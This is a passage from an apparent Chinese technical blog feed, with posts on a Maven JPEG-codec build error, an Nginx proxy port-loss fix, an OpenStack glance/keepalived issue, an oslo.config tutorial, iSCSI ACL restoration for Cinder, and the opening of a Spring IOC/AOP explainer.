com.sun.image.codec.jpeg does <span class="keyword">not</span> exist</span><br><span class="line">[INFO] <span class="number">4</span> errors </span><br><span class="line">[INFO] -------------------------------------------------------------</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Reactor Summary:</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] ztzx <span class="number">1.0</span><span class="number">.0</span> ......................................... SUCCESS [  <span class="number">0.007</span> s]</span><br><span class="line">[INFO] ztzx.service ....................................... FAILURE [<span class="number">02</span>:<span class="number">11</span> min]</span><br><span class="line">[INFO] ztzx.web <span class="number">1.0</span><span class="number">.0</span> ..................................... SKIPPED</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD FAILURE</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time: <span class="number">02</span>:<span class="number">11</span> min</span><br><span class="line">[INFO] Finished at: <span class="number">2018</span><span class="number">-08</span><span class="number">-06</span>T01:<span class="number">51</span>:<span class="number">45</span>Z</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:<span class="number">3.1</span>:compile (default-compile) on project ztzx.service: Compilation failure: Compilation failure: </span><br><span class="line">[ERROR] /home/ztzx/ztzx.service/src/main/java/com/telchina/ztzx/common/controller/UploadController2.java:[<span class="number">24</span>,<span class="number">40</span>] package com.sun.image.codec.jpeg does <span class="keyword">not</span> exist</span><br><span class="line">[ERROR] /home/ztzx/ztzx.service/src/main/java/com/telchina/ztzx/common/controller/UploadController2.java:[<span class="number">25</span>,<span class="number">40</span>] package com.sun.image.codec.jpeg does <span class="keyword">not</span> exist</span><br><span class="line">[ERROR] /home/ztzx/ztzx.service/src/main/java/com/telchina/ztzx/common/controller/UploadController.java:[<span class="number">25</span>,<span class="number">32</span>] package com.sun.image.codec.jpeg does <span class="keyword">not</span> exist</span><br><span class="line">[ERROR] /home/ztzx/ztzx.service/src/main/java/com/telchina/ztzx/common/controller/UploadController.java:[<span class="number">26</span>,<span class="number">32</span>] package com.sun.image.codec.jpeg does <span class="keyword">not</span> exist</span><br><span class="line">[ERROR] -&gt; [Help 1]</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] To see the full stack trace of the errors, re-run Maven <span class="keyword">with</span> the -e switch.</span><br><span class="line">[ERROR] Re-run Maven using the -X switch to enable full debug logging.</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] For more information about the errors <span class="keyword">and</span> possible solutions, please read the following articles:</span><br><span class="line">[ERROR] [Help <span class="number">1</span>] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] After correcting the problems, you can resume the build <span class="keyword">with</span> the command</span><br><span class="line">[ERROR]   mvn &lt;goals&gt; -rf :ztzx.service</span><br></pre></td></tr></table></figure>
<p>分析一</p>
<p>按照Java官方的解释,sun.image.codec这个package已经被deprecated，建议不要使用，看官方的解释：</p>
<p>Why Developers Should Not Write Programs That Call ‘sun’ Packages<br>The java., javax. and org.* packages documented in the Java Platform Standard Edition API Specification make up the official, supported, public interface. If a Java program directly calls only API in these packages, it will operate on all Java-compatible platforms, regardless of the underlying OS platform.</p>
<p>The sun.* packages are not part of the supported, public interface. A Java program that directly calls into sun.* packages is not guaranteed to work on all Java-compatible platforms. In fact, such a program is not guaranteed to work even in future versions on the same platform. Each company that implements the Java platform will do so in their own private way. The classes in sun.* are present in the JDK to support Oracle’s implementation of the Java platform: the sun.* classes are what make the Java platform classes work “under the covers” for Oracle’s JDK. These classes will not in general be present on another vendor’s Java platform. If your Java program asks for a class “sun.package.Foo” by name, it may fail with ClassNotFoundError, and you will have lost a major advantage of developing in Java.</p>
<p>Technically, nothing prevents your program from calling into sun.* by name. From one release to another, these classes may be removed, or they may be moved from one package to another, and it’s fairly likely that their interface (method names and signatures) will change. (From Oracle’s point of view, since we are committed to maintaining the Java platform, we need to be able to change sun.* to refine and enhance the platform.) In this case, even if you are willing to run only on Oracle’s implementation, you run the risk of a new version of the implementation breaking your program.</p>
<p>In general, writing java programs that rely on sun.* is risky: those classes are not portable, and are not supported</p>
<p>可以这样理解，Java已经被Oracle收购多年，里面再去出现sun的package算怎么回事。。O(∩_∩)O哈哈~，当然你还是可以去使用的，可以在pom.xml 经配置了下面的参数，排除无法引入jar包的问题，这个方法并不能解决我在Linux无法进行构建的的问题。</p>
<pre><code>            &lt;plugin&gt;
                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
                &lt;version&gt;3.1&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;source&gt;${jdkVersion}&lt;/source&gt;
                    &lt;target&gt;${jdkVersion}&lt;/target&gt;
                    &lt;compilerArguments&gt;
                        &lt;verbose /&gt;
                        &lt;bootclasspath&gt;${JAVA_HOME}/jre/lib/rt.jar${path.separator}${JAVA_HOME}/jre/lib/jce.jar&lt;/bootclasspath&gt;
                    &lt;/compilerArguments&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;</code></pre>
<p>分析二</p>
<p>查看mvn仓库信息</p>
<p>root@30e8e1cd5962:/home/ztzx# mvn -version<br>Apache Maven 3.5.3 (3383c37e1f9e9b3bc3df5050c29c8aff9f295297; 2018-02-24T19:49:05Z)<br>Maven home: /usr/share/maven<br>Java version: 1.8.0_91, vendor: Oracle Corporation<br>Java home: /usr/lib/jvm/java-8-openjdk-amd64/jre<br>Default locale: en, platform encoding: UTF-8<br>OS name: “linux”, version: “3.10.0-693.el7.x86_64”, arch: “amd64”, family: “unix”<br>查看Java 信息</p>
<p>root@30e8e1cd5962:/home/ztzx# java -version<br>openjdk version “1.8.0_91”<br>OpenJDK Runtime Environment (build 1.8.0_91-8u91-b14-1~bpo8+1-b14)<br>OpenJDK 64-Bit Server VM (build 25.91-b14, mixed mode)</p>
<p>与windows的运行环境相比，出Java的小版本不同外，还有一个区别，就是Oracle Java与OpenJdk的区别，google资料，发现OpenJdk已经在1.7版本移除了该package。OpenJdk移除jepg的package，将Linux 默认的OpenJdk替换为Oracle的Jdk，即可以解决问题</p>
<p>其他解决方法</p>
<p>JPEGImageEncoder类是SUN公司私有类</p>
<p>一般出现在这样的代码段中：<br>    FileOutputStream out = new FileOutputStream(dstName);<br>     JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(out);<br>     encoder.encode(dstImage);</p>
<p>改写成：</p>
<pre><code>String formatName = dstName.substring(dstName.lastIndexOf(&quot;.&quot;) + 1);
 //FileOutputStream out = new FileOutputStream(dstName);
 //JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(out);
 //encoder.encode(dstImage);
 ImageIO.write(dstImage, /*&quot;GIF&quot;*/ formatName /* format desired */ , new File(dstName) /* target */ );</code></pre>
<p>都使用统一的ImageIO进行图像格式文件的读写，没有必要使用过时的实现类JPEGImageEncoder类。</p>
]]></content>
  </entry>
  <entry>
    <title>Nginx代理端口丢失问题</title>
    <url>/2020/09/21/Nginx%E4%BB%A3%E7%90%86%E7%AB%AF%E5%8F%A3%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>     Kubernetes环境中在使用Nginx进行代理，在进行端口代理时，总是出现端口丢失的问题，例如访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">http:&#x2F;&#x2F;10.10.70.58:32007&#x2F;demo</span><br></pre></td></tr></table></figure>

<p>地址会跳转到 <a href="http://10.10.70.58:32007/demo" target="_blank" rel="noopener"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.70.58:32007&#x2F;demo</span><br></pre></td></tr></table></figure>

<p>查看代理配置如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upstream archdemo &#123;</span><br><span class="line">        server 10.10.70.61:32007;</span><br><span class="line">        server 10.10.70.62:32007;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">    listen 32007;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        proxy\_pass         http:&#x2F;&#x2F;archdemo; </span><br><span class="line">        server\_name\_in\_redirect off;</span><br><span class="line">        proxy\_set\_header X-Real-IP $remote\_addr;</span><br><span class="line">        proxy\_set\_header REMOTE-HOST $remote\_addr;</span><br><span class="line">        proxy\_set\_header X-Forwarded-For $proxy\_add\_x\_forwarded\_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里经过“面向搜索引擎的编程“，解决该问题，在进行代理配置是需要使用以下配置  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upstream archdemo &#123;</span><br><span class="line">        server 10.10.70.61:32007;</span><br><span class="line">        server 10.10.70.62:32007;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">    listen 32007;</span><br><span class="line">        server\_name\_in\_redirect off;</span><br><span class="line">        proxy\_set\_header Host $host:$server\_port;</span><br><span class="line">        proxy\_set\_header X-Real-IP $remote\_addr;</span><br><span class="line">        proxy\_set\_header REMOTE-HOST $remote\_addr;</span><br><span class="line">        proxy\_set\_header X-Forwarded-For $proxy\_add\_x\_forwarded\_for;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        proxy\_pass         http:&#x2F;&#x2F;archdemo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>[OpenStack]glance url被截断问题定位解决</title>
    <url>/2020/09/15/OpenStack-glance-url%E8%A2%AB%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98%E5%AE%9A%E4%BD%8D%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p>环境信息：两个控制节点做HA，2个计算节点问题描述：<br>    dashboard界面创建VM时，总是创建失败。查看nova日志，是下载镜像失败导致。<br>1、  命令行执行下载镜像命令<br>       glance –debug image-download 33830a96-d8a7-47fc-a732-271fde266d40 &gt; a.img <br>出现错误日志。发现第二次请求的url为空<br>2、查看glance日志 报错的代码位置<br>  /glance/api/middleware/version_negotiation.py<br><img src="http://bbs.iop365.com/iop/data/attachment/forum/201504/20/100426sn8aff8j2rnwcam2.png">   </p>
<p>非常奇怪，之前从未遇到过该现象<br>2.1 怀疑glance配置错误，与其他环境的glance配置文件对比后，发现没有错误<br>2.2 glance存储可以上传镜像，排查ceph问题<br>在其他机器上验证，发现偶尔能够成功，大部分时间都是失败的。在主控制节点一直成功，怀疑网卡网络问题<br>。。。。。。  </p>
<p>最终发现是keepalived导致的，主节点备节点IP分别是10.68.25.40  10。68.25.41，浮动IP地址为10.68.25.50<br>在两个控制节点发现都存在10.68.25.50这个浮动IP（正常情况，只能在一个节点有该IP），初步判定是keepalived配置问题，但是对比其他环境，配置一样。。。。。最终发现 我们在配置外部网络的时候配置在了eth0，在eth0创建了<br>一个br-ex网桥，静态IP配置到了br-ex，导致eth0上是没有IP的，这就不太正常了。所以修改 keepalived配置文件监听的端口为br-ex  问题解决。</p>
]]></content>
      <tags>
        <tag>OpenStack</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenStack 源码中的OSLO</title>
    <url>/2020/09/15/OpenStack-%E6%BA%90%E7%A0%81%E4%B8%AD%E7%9A%84OSLO/</url>
    <content><![CDATA[<h3 id="Oslo"><a href="#Oslo" class="headerlink" title="Oslo"></a>Oslo</h3><p>在RYU的目录下可以找到cfg.py文件，这个文件中import了oslo的相关模块，以便调用时减少引用数目。从文件中可以发现oslo.config.cfg文件是关键文件，其在系统中的文件位置在：/usr/local/lib/python2.7/dist-packages/oslo/config/cfg.py。想查看源码的读者可以自行查看。在该cfg.py文件中 定义了ConfigOpts类，包含了_opts, _groups等成员变量。该类完成了命令行和配置参数的解析。</p>
<p>如果要快速学习某一个知识，最好的办法就是把它用起来。所以首先我会介绍一个入门的教程。如果你没有看懂，可以去看原始的<a href="http://www.giantflyingsaucer.com/blog/?p=4822" target="_blank" rel="noopener">教程</a>。</p>
<p>首先安装<a href="https://virtualenv.pypa.io/en/latest/virtualenv.html" target="_blank" rel="noopener">python-virtualenv</a>，此python库可以用于创建一个虚拟的，与外界隔离的运行环境，听起来和docker好像有点像。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-virtualenv</span><br><span class="line">virtualenv example-app</span><br><span class="line">cd example-app</span><br><span class="line">source bin&#x2F;activate</span><br><span class="line">pip install oslo.config</span><br><span class="line">touch app.py</span><br><span class="line">touch app.conf</span><br></pre></td></tr></table></figure>



<p>然后修改app.conf。添加了两个group:simple和morestuff。simple组中有一个BoolOpt:enable。morestuff组有StrOpt, ListOpt, DictOpt, IntOpt,和FloatOpt。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[simple]</span><br><span class="line">enable &#x3D; True</span><br><span class="line">[morestuff]</span><br><span class="line"># StrOpt</span><br><span class="line">message &#x3D; Hello World</span><br><span class="line"># ListOpt</span><br><span class="line">usernames &#x3D; [&#39;Licheng&#39;, &#39;Muzixing&#39;, &#39;Distance&#39;]</span><br><span class="line"># DictOpt</span><br><span class="line">jobtitles &#x3D; &#123;&#39;Licheng&#39;: &#39;Manager&#39;, &#39;Muzixing&#39;: &#39;CEO&#39;, &#39;Distance&#39;: &#39;Security Guard&#39;&#125;</span><br><span class="line"># IntOpt</span><br><span class="line">payday &#x3D; 20</span><br><span class="line"># FloatOpt</span><br><span class="line">pi &#x3D; 3.14</span><br></pre></td></tr></table></figure>



<p>修改app.py文件。首先定义两个group，再对两个group的option进行定义。最后使用register_group和register_opts函数来完成group和option的注册。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">from oslo.config import cfg</span><br><span class="line">opt_simple_group &#x3D; cfg.OptGroup(name&#x3D;&#39;simple&#39;,</span><br><span class="line">                         title&#x3D;&#39;A Simple Example&#39;)</span><br><span class="line">opt_morestuff_group &#x3D; cfg.OptGroup(name&#x3D;&#39;morestuff&#39;,</span><br><span class="line">                         title&#x3D;&#39;A More Complex Example&#39;)</span><br><span class="line">simple_opts &#x3D; [</span><br><span class="line">    cfg.BoolOpt(&#39;enable&#39;, default&#x3D;False,</span><br><span class="line">                help&#x3D;(&#39;True enables, False disables&#39;))</span><br><span class="line">]</span><br><span class="line">morestuff_opts &#x3D; [</span><br><span class="line">    cfg.StrOpt(&#39;message&#39;, default&#x3D;&#39;No data&#39;,</span><br><span class="line">               help&#x3D;(&#39;A message&#39;)),</span><br><span class="line">    cfg.ListOpt(&#39;usernames&#39;, default&#x3D;None,</span><br><span class="line">                help&#x3D;(&#39;A list of usernames&#39;)),</span><br><span class="line">    cfg.DictOpt(&#39;jobtitles&#39;, default&#x3D;None,</span><br><span class="line">                help&#x3D;(&#39;A dictionary of usernames and job titles&#39;)),</span><br><span class="line">    cfg.IntOpt(&#39;payday&#39;, default&#x3D;30,</span><br><span class="line">                help&#x3D;(&#39;Default payday monthly date&#39;)),</span><br><span class="line">    cfg.FloatOpt(&#39;pi&#39;, default&#x3D;0.0,</span><br><span class="line">                help&#x3D;(&#39;The value of Pi&#39;))</span><br><span class="line">]</span><br><span class="line">CONF &#x3D; cfg.CONF</span><br><span class="line">CONF.register_group(opt_simple_group)</span><br><span class="line">CONF.register_opts(simple_opts, opt_simple_group)</span><br><span class="line">CONF.register_group(opt_morestuff_group)</span><br><span class="line">CONF.register_opts(morestuff_opts, opt_morestuff\_group)</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    CONF(default_config_files&#x3D;[&#39;app.conf&#39;])</span><br><span class="line">    print(&#39;(simple) enable: &#123;&#125;&#39;.format(CONF.simple.enable))</span><br><span class="line">    print(&#39;(morestuff) message :&#123;&#125;&#39;.format(CONF.morestuff.message))</span><br><span class="line">    print(&#39;(morestuff) usernames: &#123;&#125;&#39;.format(CONF.morestuff.usernames))</span><br><span class="line">    print(&#39;(morestuff) jobtitles: &#123;&#125;&#39;.format(CONF.morestuff.jobtitles))</span><br><span class="line">    print(&#39;(morestuff) payday: &#123;&#125;&#39;.format(CONF.morestuff.payday))</span><br><span class="line">    print(&#39;(morestuff) pi: &#123;&#125;&#39;.format(CONF.morestuff.pi))</span><br></pre></td></tr></table></figure>




<p>完成之后，运行app.py文件。可以查看到相关输出。</p>
<p>回到RYU中，之前一篇<a href="http://www.muzixing.com/pages/2014/12/10/ryuxue-xi-eventlet.html" target="_blank" rel="noopener">博客</a>介绍了RYU的main函数。在ryu/ryu/cmd/manager.py文件中我们可以看到如下的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONF.register_cli_opts([</span><br><span class="line">    cfg.ListOpt(&#39;app-lists&#39;, default&#x3D;[],</span><br><span class="line">                help&#x3D;&#39;application module name to run&#39;),</span><br><span class="line">    cfg.MultiStrOpt(&#39;app&#39;, positional&#x3D;True, default&#x3D;[],</span><br><span class="line">                    help&#x3D;&#39;application module name to run&#39;),</span><br><span class="line">    cfg.StrOpt(&#39;pid-file&#39;, default&#x3D;None, help&#x3D;&#39;pid file name&#39;),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">以上的注册了三个Option，其中的app-lists和app参数是运行ryu-manager时的参数，即APP的名称。在以下的main函数中，我们可以看到首先获取了输入的参数，若参数为空，则默认开启ofp\_handler应用。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def main(args&#x3D;None, prog&#x3D;None):</span><br><span class="line">    try:</span><br><span class="line">        CONF(args&#x3D;args, prog&#x3D;prog,</span><br><span class="line">             project&#x3D;&#39;ryu&#39;, version&#x3D;&#39;ryu-manager %s&#39; % version,</span><br><span class="line">             default_config_files&#x3D;[&#39;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;ryu&#x2F;ryu.conf&#39;])</span><br><span class="line">    except cfg.ConfigFilesNotFoundError:</span><br><span class="line">        CONF(args&#x3D;args, prog&#x3D;prog,</span><br><span class="line">             project&#x3D;&#39;ryu&#39;, version&#x3D;&#39;ryu-manager %s&#39; % version)</span><br><span class="line"></span><br><span class="line">    log.init_log()</span><br><span class="line"></span><br><span class="line">    if CONF.pid_file:</span><br><span class="line">        import os</span><br><span class="line">        with open(CONF.pid_file, &#39;w&#39;) as pid\_file:</span><br><span class="line">            pid_file.write(str(os.getpid()))</span><br><span class="line"></span><br><span class="line">    app_lists &#x3D; CONF.app_lists + CONF.app</span><br><span class="line">    # keep old behaivor, run ofp if no application is specified.</span><br><span class="line">    if not app_lists:</span><br><span class="line">        app_lists &#x3D; [&#39;ryu.controller.ofp_handler&#39;]</span><br></pre></td></tr></table></figure>



<p>oslo模块使用能够使得整个工程的不同模块可以使用同一个配置文件，从而减少了命令冲突的可能，此外，oslo提供的模板，可以让命令解析更方便。在oslo.config之外，还有oslo.db,oslo.messaging等。</p>
<p>  针对OpenStack 多个组件，OpenStack社区开发了不少公共组件OSOL：<a href="https://github.com/openstack/?query=oslo" target="_blank" rel="noopener">https://github.com/openstack/?query=oslo</a></p>
]]></content>
      <tags>
        <tag>OpenStack</tag>
      </tags>
  </entry>
  <entry>
    <title>Restore iSCSI configuration for Cinder/Nova</title>
    <url>/2020/09/15/Restore-iSCSI-configuration-for-Cinder-Nova/</url>
    <content><![CDATA[<h3 id="Restore-iSCSI-configuration-for-Cinder-Nova"><a href="#Restore-iSCSI-configuration-for-Cinder-Nova" class="headerlink" title="Restore iSCSI configuration for Cinder / Nova"></a>Restore iSCSI configuration for Cinder / Nova</h3><p>In few cases (i.e. cinder-volume crash), some cinder volumes cannot be accessed by a VM (I/O errors), but are still displayed as associated when using cinder or nova CLI. Looking at the hypervisor’s log, you may see:<br>May 11 13:26:45 cloudhyp1 iscsid: conn 0 login rejected: target error (03/01)<br>May 11 13:26:45 cloudhyp1 iscsid: conn 0 login rejected: initiator failed authorization with target<br>May 11 13:26:45 cloudhyp1 iscsid: conn 0 login rejected: initiator failed authorization with target<br>On the cinder-volume host, check the configuration of iSCSI target:  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\[root@controller?~\]\# targetcli ls  </span><br><span class="line">o- &#x2F; ......................................................................................................................... [...]  </span><br><span class="line">? o- backstores .............................................................................................................. [...]  </span><br><span class="line">? | o- block .................................................................................................. [Storage Objects: 1]  </span><br><span class="line">? | | o- iqn.2010-10.org.openstack:volume-6e95e5b6-83e1-4958-a5e1-ba5afc94559e? \[&#x2F;dev&#x2F;cinder-volumes&#x2F;volume-6e95e5b6-83e1-4958-a5e1-ba5afc94559e (20.0GiB) write-thru activated]  </span><br><span class="line">? | o- fileio ................................................................................................. [Storage Objects: 0]  </span><br><span class="line">? | o- pscsi .................................................................................................. [Storage Objects: 0]  </span><br><span class="line">? | o- ramdisk ................................................................................................ [Storage Objects: 0]  </span><br><span class="line">? o- iscsi ............................................................................................................ [Targets: 7]  </span><br><span class="line">? | o- iqn.2010-10.org.openstack:volume-6e95e5b6-83e1-4958-a5e1-ba5afc94559e ............................................. [TPGs: 1]  </span><br><span class="line">? | | o- tpg1 .......................................................................................... [no-gen-acls, auth per-acl]  </span><br><span class="line">? | |?? o- acls .......................................................................................................... [ACLs: 0]  </span><br><span class="line">? | |?? o- luns .......................................................................................................... [LUNs: 1]  </span><br><span class="line">? | |?? | o- lun0? [block&#x2F;iqn.2010-10.org.openstack:volume-6e95e5b6-83e1-4958-a5e1-ba5afc94559e (&#x2F;dev&#x2F;cinder-volumes&#x2F;volume-6e95e5b6-83e1-4958-a5e1-ba5afc94559e)\]  </span><br><span class="line">? | |?? o- portals .................................................................................................... [Portals: 1]  </span><br><span class="line">? | |???? o- 192.168.1.1:3260 ................................................................................................. [OK]  </span><br><span class="line">? o- loopback ......................................................................................................... [Targets: 0]</span><br></pre></td></tr></table></figure>
<p>In that case, the cloudhyp1 cannot connect to the target because no ACL are defined ([ACLs: 0])  </p>
<p>?You have to setup the ACL manually:  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@controller?~]# mysql -u cinder -p -e &quot;select provider_auth from volumes where id&#x3D;&#39;6e95e5b6-83e1-4958-a5e1-ba5afc94559e&#39;&quot; cinder  </span><br><span class="line">Enter password:?  </span><br><span class="line">+------------------------------------------------+  </span><br><span class="line">| provider_auth????????????????????????????????? |  </span><br><span class="line">+------------------------------------------------+  </span><br><span class="line">| CHAP xjrFIwOQ66ktkxjrFIwO?vr2twXxoDww7wvr2twXx |  </span><br><span class="line">+------------------------------------------------+  </span><br><span class="line">The first entry is the username and the second the password. You can check that you have the same value on the hypervisor (1, 2):  </span><br><span class="line">[root@cloudhyp1 ~]# grep node.session.auth &#x2F;var&#x2F;lib&#x2F;iscsi&#x2F;nodes&#x2F;iqn.2010-10.org.openstack:volume-6e95e5b6-83e1-4958-a5e1-ba5afc94559e&#x2F;192.168.1.1,3260,1&#x2F;default?  </span><br><span class="line">node.session.auth.authmethod &#x3D; CHAP  </span><br><span class="line">node.session.auth.username &#x3D;?xjrFIwOQ66ktkxjrFIwO  </span><br><span class="line">node.session.auth.password &#x3D;?vr2twXxoDww7wvr2twXx  </span><br><span class="line">On the hypervisor, you need also to get the initiator id (3):  </span><br><span class="line">[root@cloudhyp1 ~]# cat &#x2F;etc&#x2F;iscsi&#x2F;initiatorname.iscsi  </span><br><span class="line">InitiatorName&#x3D;iqn.1994-05.com.redhat:1abc12d345e6  </span><br><span class="line">  </span><br><span class="line">To update the ACL, first save the targetcli configuration:  </span><br><span class="line">[root@controller?~]# targetctl save  </span><br><span class="line">[root@controller?~]# cp &#x2F;etc&#x2F;target&#x2F;saveconfig.json &#x2F;etc&#x2F;target&#x2F;saveconfig.old  </span><br><span class="line">  </span><br><span class="line">Replace:  </span><br><span class="line">????????? &quot;node_acls&quot;: []?  </span><br><span class="line">  </span><br><span class="line">By for the right volume (iqn.2010-10.org.openstack:volume-6e95e5b6-83e1-4958-a5e1-ba5afc94559e?in our case) :  </span><br><span class="line">????????? &quot;node_acls&quot;: [  </span><br><span class="line">??????????? &#123;  </span><br><span class="line">????????????? &quot;attributes&quot;: &#123;  </span><br><span class="line">??????????????? &quot;dataout_timeout&quot;: 3,?  </span><br><span class="line">??????????????? &quot;dataout_timeout_retries&quot;: 5,?  </span><br><span class="line">??????????????? &quot;default_erl&quot;: 0,?  </span><br><span class="line">??????????????? &quot;nopin_response_timeout&quot;: 30,?  </span><br><span class="line">??????????????? &quot;nopin_timeout&quot;: 15,?  </span><br><span class="line">??????????????? &quot;random_datain_pdu_offsets&quot;: 0,?  </span><br><span class="line">??????????????? &quot;random_datain_seq_offsets&quot;: 0,?  </span><br><span class="line">??????????????? &quot;random_r2t_offsets&quot;: 0  </span><br><span class="line">????????????? &#125;,?  </span><br><span class="line">????????????? &quot;chap_password&quot;: &quot;vr2twXxoDww7wvr2twXx&quot;,?  </span><br><span class="line">????????????? &quot;chap_userid&quot;: &quot;xjrFIwOQ66ktkxjrFIwO&quot;,?  </span><br><span class="line">????????????? &quot;mapped_luns&quot;: [  </span><br><span class="line">??????????????? &#123;  </span><br><span class="line">????????????????? &quot;index&quot;: 0,?  </span><br><span class="line">????????????????? &quot;tpg_lun&quot;: 0,?  </span><br><span class="line">????????????????? &quot;write_protect&quot;: false  </span><br><span class="line">??????????????? &#125;  </span><br><span class="line">????????????? ],?  </span><br><span class="line">????????????? &quot;node_wwn&quot;: &quot;iqn.1994-05.com.redhat:1abc12d345e6&quot;  </span><br><span class="line">??????????? &#125;?  </span><br><span class="line">????????? ]?</span><br></pre></td></tr></table></figure>
<p>You have to replace?<em>chap_userid_,?_chap_password</em>?and?_node_wwn_?by values obtained in steps?<strong>1</strong>,?<strong>2</strong>and?<strong>3</strong>?respectively.<br>Then check and load the configuration:  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# cat &#x2F;etc&#x2F;target&#x2F;saveconfig.json | json_verify  </span><br><span class="line">JSON is valid  </span><br><span class="line">[root@controller ~]# targetctl restore  </span><br><span class="line">You can connect again to the iSCSI target from the hypervisor:  </span><br><span class="line">[root@cloudhyp1 ~]# iscsiadm -m node -T iqn.2010-10.org.openstack:volume-6e95e5b6-83e1-4958-a5e1-ba5afc94559e -l</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Spring的IOC与AOP（转载）</title>
    <url>/2020/09/15/Spring%E7%9A%84IOC%E4%B8%8EAOP%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/</url>
    <content><![CDATA[<p>众所周知，Spring的核心特性就是IOC和AOP，IOC（Inversion of Control），即“控制反转”；AOP（Aspect-OrientedProgramming），即“面向切面编程”。参考书《Spring In Action》，下面分享一下我对这两大特性的个人理解。</p>
<p>IOC：IOC，另外一种说法叫DI（Dependency Injection），即依赖注入。它并不是一种技术实现，而是一种设计思想。在任何一个有实际开发意义的程序项目中，我们会使用很多类来描述它们特有的功能，并且通过类与类之间的相互协作来完成特定的业务逻辑。这个时候，每个类都需要负责管理与自己有交互的类的引用和依赖，代码将会变的异常难以维护和极度的高耦合。而IOC的出现正是用来解决这个问题，我们通过IOC将这些相互依赖对象的创建、协调工作交给Spring容器去处理，每个对象只需要关注其自身的业务逻辑关系就可以了。在这样的角度上来看，获得依赖的对象的方式，进行了反转，变成了由spring容器控制对象如何获取外部资源（包括其他对象和文件资料等等）。</p>
<blockquote>
<p>举例：某一天，你生病了，但是你不清楚自己到底得了什么病，你只知道自己头疼，咳嗽，全身无力。这个时候你决定去药店买药，药店有很多种药，仅仅是治疗头疼就有好几十种，还有西药中药等区别。然后你自己看了看说明书，选择了一盒你自己觉得最能治疗自己病症的药，付钱吃药，期待可以早点好起来。 <br>但是这个过程，对于一个病人来说，太辛苦了。头疼，咳嗽，全身无力，还要一个个的看药品说明书，一个个的比较哪个药比较好，简直是太累了。这个时候，你决定直接去医院看医生。 <br>医生给你做了检查，知道你的病症是什么，有什么原因引起的；同时医生非常了解有哪些药能治疗你的病痛，并且能根据你的自身情况进行筛选。只需要短短的十几分钟，你就能拿到对症下药的药品，即省时又省力。</p>
</blockquote>
<p>在上面这个例子中，IOC起到的就是医生的作用，它收集你的需求要求，并且对症下药，直接把药开给你。你就是对象，药品就是你所需要的外部资源。通过医生，你不用再去找药品，而是通过医生把药品开给你。这就是整个IOC的精髓所在。</p>
<p>AOP：面向切面编程，往往被定义为促使软件系统实现关注点的分离的技术。系统是由许多不同的组件所组成的，每一个组件各负责一块特定功能。除了实现自身核心功能之外，这些组件还经常承担着额外的职责。例如日志、事务管理和安全这样的核心服务经常融入到自身具有核心业务逻辑的组件中去。这些系统服务经常被称为横切关注点，因为它们会跨越系统的多个组件。</p>
<p>AOP的概念不好像IOC一样实例化举例，现在我们以一个系统中的具体实现来讲讲AOP具体是个什么技术。</p>
<blockquote>
